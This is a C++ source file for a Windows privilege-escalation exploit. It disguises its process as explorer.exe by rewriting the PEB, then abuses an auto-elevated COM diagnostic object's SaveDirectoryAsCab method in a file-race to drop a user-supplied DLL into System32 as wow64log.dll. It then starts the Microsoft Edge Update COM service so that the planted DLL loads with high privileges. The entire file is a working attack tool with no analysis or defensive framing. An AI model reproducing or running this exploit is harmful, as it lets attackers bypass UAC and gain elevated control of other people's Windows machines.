#include <Windows.h>
#include <combaseapi.h>
#include <stdio.h>

#define CLSID_VF_DiagCpl_Elevation L"Elevation:Administrator!new:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}"
#define Method L"SaveDirectoryAsCab"
#define Dir L"C:\\Uac"
#define File L"C:\\Uac\\results.cab"
#define DLL L"C:\\Windows\\System32\\wow64log.dll"
struct __declspec(uuid("A6B716CB-028B-404D-B72C-50E153DD68DA")) CLSID_MSEdge_Object;
struct __declspec(uuid("D0B7E02C-E1A3-11DC-81FF-001185AE5E76")) CLSID_DiagnosticProfile_Object;
class __declspec(uuid("804bd226-af47-4d71-b492-443a57610b08")) IElevatedFactoryServer : public IUnknown {
public:
	virtual HRESULT __stdcall ServerCreateElevatedObject(/* Stack Offset: 8 */ CLSID p0, /* Stack Offset: 16 */ IID p1, /* Stack Offset: 24 */ /* iid_is param offset: 16 */ void** p2);
};

// For MicrosoftEdgeUpdate (@KLINIX5 https://halove23.blogspot.com/2021/03/google-update-service-being-scum.html) 

class __declspec(uuid("79e0c401-b7bc-4de5-8104-71350f3a9b67")) IGoogleUpdate : IUnknown {
public:
	
		
		HRESULT CheckForUpdate(const WCHAR* guid,VOID* observer);
		HRESULT Update(const WCHAR* guid, VOID* observer);

};
//Function to masquerade PEB
//Credits: @FuzzySec / @Cneelis
BOOL MasqueradePEB();

VOID Trigger(const WCHAR* target);
VOID Move(wchar_t* dll);
int wmain(int argc, wchar_t** argv) {
	HANDLE hFile;
	if (argc < 2) {
		printf("Usage: %ls <path to dll>", argv[0]);
		exit(1);
	}
	HANDLE hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Move, argv[1], 0, NULL);
	BOOL ret = SetThreadPriority(hthread, THREAD_PRIORITY_TIME_CRITICAL);
	Trigger(DLL);
	while (TRUE) {
		hFile = CreateFile(DLL, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			printf("[*] File %ls created!\n",DLL);
			break;

		}
	}
	
	HRESULT coini = CoInitialize(NULL);
	IGoogleUpdate* updater = NULL;	
	
	HRESULT hr = CoCreateInstance(__uuidof(CLSID_MSEdge_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater),(PVOID*)&updater);
	if (SUCCEEDED(hr)) {
		printf("[*] MicrosoftEdgeUpdate started\n");
	}
	else {
		printf("[!] Error: 0x%x\n ", hr);
	}
	
}

VOID Trigger(const WCHAR* target) {
	HRESULT hr;
	BIND_OPTS3 bop;
	CLSID clsid;
	LPDISPATCH pdisp = NULL;
	LPUNKNOWN punk = NULL;
	DISPID dispid;
	IElevatedFactoryServer* pIElevatedFactoryServer;
	LPOLESTR a = (wchar_t*)Method;
	DISPPARAMS dp = { nullptr, nullptr, 0, 0 };
	VARIANT* args = new VARIANT[2];
	VARIANT result;
	VariantInit(&args[0]);
	args[0].vt = VT_BSTR;
	args[0].bstrVal = SysAllocString(target);
	VariantInit(&args[1]);
	args[1].vt = VT_BSTR;
	args[1].bstrVal = SysAllocString(Dir);
	dp.rgvarg = args;
	dp.cArgs = 2;

	if (!CreateDirectory(Dir, NULL)) {
		exit(1);
	}
	MasqueradePEB();
	hr = CoInitialize(NULL);
	if (SUCCEEDED(hr)) {
		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = 4;
		hr = CoGetObject(CLSID_VF_DiagCpl_Elevation, &bop, __uuidof(IElevatedFactoryServer), (PVOID*)&pIElevatedFactoryServer);
		if (SUCCEEDED(hr)) {
				hr = pIElevatedFactoryServer->ServerCreateElevatedObject(__uuidof(CLSID_DiagnosticProfile_Object), IID_IUnknown, (PVOID*)&punk);
				if (SUCCEEDED(hr)) {
					hr = punk->QueryInterface(IID_IDispatch, (void**)&pdisp);
					if (SUCCEEDED(hr)) {
						
						hr = pdisp->GetIDsOfNames(IID_NULL, &a, 1, LOCALE_USER_DEFAULT, &dispid);
						if (SUCCEEDED(hr)) {
							hr = pdisp->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &dp, &result, nullptr, nullptr);
							if (SUCCEEDED(hr)) {
								VariantClear(&args[0]);
								VariantClear(&args[1]);
								delete[] args;
								RemoveDirectoryW(Dir);
							}
							else
							{
								printf("Error : 0x%x\n", hr);
								VariantClear(&args[0]);
								VariantClear(&args[1]);
								delete[] args;
							}
						}
					}
				}
				pIElevatedFactoryServer->Release();


		}
		CoUninitialize();
	}

}
VOID Move(wchar_t* dll) {
	HANDLE hFile;
	HANDLE hFile2;
	ULONG toread, towrite;
	hFile2 = CreateFile(dll, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	ULONG size = GetFileSize(hFile2, NULL);
	LPVOID buff = malloc(size);
	ReadFile(hFile2, buff, size, &toread, NULL);

	while (TRUE) {
		hFile = CreateFile(File, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			if(WriteFile(hFile,buff,size,&towrite,NULL)){
				
}
		}
	}
}
BOOL MasqueradePEB() {
	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}
